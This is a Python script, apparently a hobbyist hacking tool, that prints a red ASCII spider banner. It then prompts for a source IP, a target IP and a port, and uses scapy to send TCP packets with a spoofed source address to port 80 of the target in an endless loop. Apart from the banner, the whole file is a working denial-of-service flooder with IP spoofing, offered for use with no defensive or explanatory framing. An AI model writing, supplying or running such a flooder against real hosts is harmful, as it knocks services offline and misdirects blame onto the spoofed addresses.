

import sys

from scapy.all import IP, TCP, send






def draw_spider():
    spider = '''
                        @@@@@@@@@@@@@@@@@@@                   `
                 @@@@@@             @@@@@@@                
              @@@@                       @@@@              
             @@@                             @@            
            @@                                @@           
           @@                     `           @@          `
          @@                                   @@          
          @@ @@                             @@ @@          
          @@ @@                             @@  @          
          @@ @@                             @@  @          
          @@  @@                            @@ @@          
          @@  @@                           @@  @@          
           @@ @@   @@@@@@@@     @@@@@@@@   @@ @@           
            @@@@ @@@@@@@@@@     @@@@@@@@@@ @@@@@           
             @@@ @@@@@@@@@@     @@@@@@@@@@ @@@             
    @@@       @@  @@@@@@@@       @@@@@@@@@  @@      @@@@   
   @@@@@     @@   @@@@@@@   @@@   @@@@@@@   @@     @@@@@@  
  @@   @@    @@     @@@    @@@@@    @@@     @@    @@   @@  
 @@@    @@@@  @@          @@@@@@@          @@  @@@@    @@@ 
@@         @@@@@@@@       @@@@@@@       @@@@@@@@@        @@
@@@@@@@@@     @@@@@@@@    @@@@@@@    @@@@@@@@      @@@@@@@@
  @@@@ @@@@@      @@@@@              @@@ @@     @@@@@@ @@@ 
          @@@@@@  @@@  @@           @@  @@@  @@@@@@        
              @@@@@@ @@ @@@@@@@@@@@ @@ @@@@@@              
                  @@ @@ @ @ @ @ @ @ @ @ @@                 
                @@@@  @ @ @ @ @ @ @ @   @@@@@              
            @@@@@ @@   @@@@@@@@@@@@@   @@ @@@@@            
    @@@@@@@@@@     @@                 @@      @@@@@@@@@    
   @@           @@@@@@@             @@@@@@@@          @@   
    @@@     @@@@@     @@@@@@@@@@@@@@@     @@@@@     @@@    
      @@   @@@           @@@@@@@@@           @@@   @@      
      @@  @@                                   @@  @@      
       @@@@                                     @@@@       

    '''
    return spider

def colorize(text, color):
    colors = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'magenta': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'reset': '\033[0m'
    }
    return colors[color] + text + colors['reset']

    
def img():
    red_spider = colorize(draw_spider(),  'red')
    print(red_spider)


if __name__ == '__main__':
   img() 


source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number: "))
i = 1

while True:
    IP1 = IP(src=source_IP, dst=target_IP)
    TCP1 = TCP(sport=source_port, dport=80)
    pkt = IP1 / TCP1
    send(pkt, inter=.001)
    print("Packet sent", i)
    i = i + 1